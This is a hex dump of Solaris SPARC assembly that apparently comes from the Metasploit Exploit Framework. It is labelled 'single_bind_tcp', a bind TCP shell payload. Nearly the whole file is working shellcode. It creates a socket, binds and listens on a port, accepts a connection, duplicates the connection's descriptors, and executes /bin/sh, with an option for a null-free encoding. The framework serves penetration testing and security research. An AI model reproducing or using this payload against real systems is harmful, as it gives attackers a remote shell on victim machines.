00000000  23 23 0d 0a 23 0d 0a 23  20 20 20 20 20 20 20 20  |##..#..#        |
00000010  4e 61 6d 65 3a 20 73 69  6e 67 6c 65 5f 62 69 6e  |Name: single_bin|
00000020  64 5f 74 63 70 0d 0a 23  20 20 20 50 6c 61 74 66  |d_tcp..#   Platf|
00000030  6f 72 6d 73 3a 20 53 6f  6c 61 72 69 73 0d 0a 23  |orms: Solaris..#|
00000040  20 20 20 20 20 41 75 74  68 6f 72 73 3a 20 76 6c  |     Authors: vl|
00000050  61 64 39 30 32 20 3c 76  6c 61 64 39 30 32 20 5b  |ad902 <vlad902 [|
00000060  61 74 5d 20 67 6d 61 69  6c 2e 63 6f 6d 3e 0d 0a  |at] gmail.com>..|
00000070  23 20 20 20 20 20 56 65  72 73 69 6f 6e 3a 20 24  |#     Version: $|
00000080  52 65 76 69 73 69 6f 6e  3a 20 31 2e 32 20 24 0d  |Revision: 1.2 $.|
00000090  0a 23 20 20 20 20 20 4c  69 63 65 6e 73 65 3a 0d  |.#     License:.|
000000a0  0a 23 0d 0a 23 20 20 20  20 20 20 20 20 54 68 69  |.#..#        Thi|
000000b0  73 20 66 69 6c 65 20 69  73 20 70 61 72 74 20 6f  |s file is part o|
000000c0  66 20 74 68 65 20 4d 65  74 61 73 70 6c 6f 69 74  |f the Metasploit|
000000d0  20 45 78 70 6c 6f 69 74  20 46 72 61 6d 65 77 6f  | Exploit Framewo|
000000e0  72 6b 0d 0a 23 20 20 20  20 20 20 20 20 61 6e 64  |rk..#        and|
000000f0  20 69 73 20 73 75 62 6a  65 63 74 20 74 6f 20 74  | is subject to t|
00000100  68 65 20 73 61 6d 65 20  6c 69 63 65 6e 73 65 73  |he same licenses|
00000110  20 61 6e 64 20 63 6f 70  79 72 69 67 68 74 73 20  | and copyrights |
00000120  61 73 0d 0a 23 20 20 20  20 20 20 20 20 74 68 65  |as..#        the|
00000130  20 72 65 73 74 20 6f 66  20 74 68 69 73 20 70 61  | rest of this pa|
00000140  63 6b 61 67 65 2e 0d 0a  23 0d 0a 23 20 44 65 73  |ckage...#..# Des|
00000150  63 72 69 70 74 69 6f 6e  3a 0d 0a 23 0d 0a 23 20  |cription:..#..# |
00000160  20 20 20 20 20 20 20 53  69 6e 67 6c 65 20 62 69  |       Single bi|
00000170  6e 64 20 54 43 50 20 73  68 65 6c 6c 2e 0d 0a 23  |nd TCP shell...#|
00000180  0d 0a 23 23 0d 0a 0d 0a  2e 67 6c 6f 62 6c 20 6d  |..##.....globl m|
00000190  61 69 6e 0d 0a 0d 0a 6d  61 69 6e 3a 0d 0a 09 61  |ain....main:...a|
000001a0  6e 64 6e 09 25 73 70 2c  20 37 2c 20 25 73 70 0d  |ndn.%sp, 7, %sp.|
000001b0  0a 0d 0a 09 6d 6f 76 09  31 2c 20 25 6f 34 0d 0a  |....mov.1, %o4..|
000001c0  09 78 6f 72 09 25 6f 33  2c 20 25 6f 33 2c 20 25  |.xor.%o3, %o3, %|
000001d0  6f 33 0d 0a 09 78 6f 72  09 25 6f 33 2c 20 25 6f  |o3...xor.%o3, %o|
000001e0  33 2c 20 25 6f 32 0d 0a  09 6d 6f 76 09 30 78 30  |3, %o2...mov.0x0|
000001f0  32 2c 20 25 6f 31 0d 0a  09 6d 6f 76 09 30 78 30  |2, %o1...mov.0x0|
00000200  32 2c 20 25 6f 30 0d 0a  09 6d 6f 76 09 30 78 65  |2, %o0...mov.0xe|
00000210  36 2c 20 25 67 31 0d 0a  09 74 61 09 30 78 30 38  |6, %g1...ta.0x08|
00000220  0d 0a 0d 0a 09 73 74 09  25 6f 30 2c 20 5b 20 25  |.....st.%o0, [ %|
00000230  73 70 20 2d 20 30 78 30  38 20 5d 0d 0a 0d 0a 23  |sp - 0x08 ]....#|
00000240  69 66 6e 64 65 66 20 4e  4f 5f 4e 55 4c 4c 53 0d  |ifndef NO_NULLS.|
00000250  0a 09 73 65 74 09 30 78  30 30 30 32 37 61 36 38  |..set.0x00027a68|
00000260  2c 20 25 6c 30 0d 0a 23  65 6c 73 65 0d 0a 09 73  |, %l0..#else...s|
00000270  65 74 09 30 78 32 37 61  36 38 66 66 66 2c 20 25  |et.0x27a68fff, %|
00000280  6c 30 0d 0a 09 73 72 6c  09 25 6c 30 2c 20 31 32  |l0...srl.%l0, 12|
00000290  2c 20 25 6c 30 0d 0a 23  65 6e 64 69 66 0d 0a 09  |, %l0..#endif...|
000002a0  73 74 09 25 6c 30 2c 20  5b 20 25 73 70 20 2d 20  |st.%l0, [ %sp - |
000002b0  30 78 31 30 20 5d 0d 0a  09 73 74 09 25 67 30 2c  |0x10 ]...st.%g0,|
000002c0  20 5b 20 25 73 70 20 2d  20 30 78 30 63 20 5d 0d  | [ %sp - 0x0c ].|
000002d0  0a 09 73 75 62 09 25 73  70 2c 20 31 36 2c 20 25  |..sub.%sp, 16, %|
000002e0  6f 31 0d 0a 09 6d 6f 76  09 30 78 31 30 2c 20 25  |o1...mov.0x10, %|
000002f0  6f 32 0d 0a 09 6d 6f 76  09 30 78 65 38 2c 20 25  |o2...mov.0xe8, %|
00000300  67 31 0d 0a 09 74 61 09  30 78 30 38 0d 0a 0d 0a  |g1...ta.0x08....|
00000310  09 6c 64 09 5b 20 25 73  70 20 2d 20 30 78 30 38  |.ld.[ %sp - 0x08|
00000320  20 5d 2c 20 25 6f 30 0d  0a 09 6d 6f 76 09 30 78  | ], %o0...mov.0x|
00000330  30 31 2c 20 25 6f 31 0d  0a 09 6d 6f 76 09 30 78  |01, %o1...mov.0x|
00000340  65 39 2c 20 25 67 31 0d  0a 09 74 61 09 30 78 30  |e9, %g1...ta.0x0|
00000350  38 0d 0a 0d 0a 09 6c 64  09 5b 20 25 73 70 20 2d  |8.....ld.[ %sp -|
00000360  20 30 78 30 38 20 5d 2c  20 25 6f 30 0d 0a 09 78  | 0x08 ], %o0...x|
00000370  6f 72 09 25 6f 31 2c 20  25 6f 31 2c 20 25 6f 31  |or.%o1, %o1, %o1|
00000380  0d 0a 09 6f 72 09 25 6f  31 2c 20 25 6f 31 2c 20  |...or.%o1, %o1, |
00000390  25 6f 32 0d 0a 09 6d 6f  76 09 30 78 65 61 2c 20  |%o2...mov.0xea, |
000003a0  25 67 31 0d 0a 09 74 61  09 30 78 30 38 0d 0a 0d  |%g1...ta.0x08...|
000003b0  0a 09 73 74 09 25 6f 30  2c 20 5b 20 25 73 70 20  |..st.%o0, [ %sp |
000003c0  2d 20 30 78 30 38 20 5d  0d 0a 09 6d 6f 76 09 33  |- 0x08 ]...mov.3|
000003d0  2c 20 25 6f 32 0d 0a 66  63 6e 74 6c 5f 6c 6f 6f  |, %o2..fcntl_loo|
000003e0  70 3a 0d 0a 09 6d 6f 76  09 39 2c 20 25 6f 31 0d  |p:...mov.9, %o1.|
000003f0  0a 09 73 75 62 63 63 09  25 6f 32 2c 20 31 2c 20  |..subcc.%o2, 1, |
00000400  25 6f 32 0d 0a 09 6d 6f  76 09 30 78 33 65 2c 20  |%o2...mov.0x3e, |
00000410  25 67 31 0d 0a 09 74 61  09 30 78 30 38 0d 0a 0d  |%g1...ta.0x08...|
00000420  0a 09 62 6e 7a 09 66 63  6e 74 6c 5f 6c 6f 6f 70  |..bnz.fcntl_loop|
00000430  0d 0a 09 6c 64 09 5b 20  25 73 70 20 2d 20 30 78  |...ld.[ %sp - 0x|
00000440  30 38 20 5d 2c 20 25 6f  30 0d 0a 0d 0a 09 78 6f  |08 ], %o0.....xo|
00000450  72 09 25 6f 33 2c 20 25  6f 33 2c 20 25 6f 32 0d  |r.%o3, %o3, %o2.|
00000460  0a 09 73 65 74 09 30 78  32 66 36 32 36 39 36 65  |..set.0x2f62696e|
00000470  2c 20 25 6c 30 0d 0a 09  73 65 74 09 30 78 32 66  |, %l0...set.0x2f|
00000480  37 33 36 38 30 30 2c 20  25 6c 31 0d 0a 09 73 75  |736800, %l1...su|
00000490  62 09 25 73 70 2c 20 30  78 31 30 2c 20 25 6f 30  |b.%sp, 0x10, %o0|
000004a0  0d 0a 09 73 75 62 09 25  73 70 2c 20 30 78 30 38  |...sub.%sp, 0x08|
000004b0  2c 20 25 6f 31 0d 0a 09  73 74 64 09 25 6c 30 2c  |, %o1...std.%l0,|
000004c0  20 5b 20 25 73 70 20 2d  20 30 78 31 30 20 5d 09  | [ %sp - 0x10 ].|
000004d0  0d 0a 09 73 74 09 25 6f  30 2c 20 5b 20 25 73 70  |...st.%o0, [ %sp|
000004e0  20 2d 20 30 78 30 38 20  5d 0d 0a 09 73 74 09 25  | - 0x08 ]...st.%|
000004f0  67 30 2c 20 5b 20 25 73  70 20 2d 20 30 78 30 34  |g0, [ %sp - 0x04|
00000500  20 5d 0d 0a 09 6d 6f 76  09 30 78 33 62 2c 20 25  | ]...mov.0x3b, %|
00000510  67 31 0d 0a 09 74 61 09  30 78 30 38              |g1...ta.0x08|
0000051c
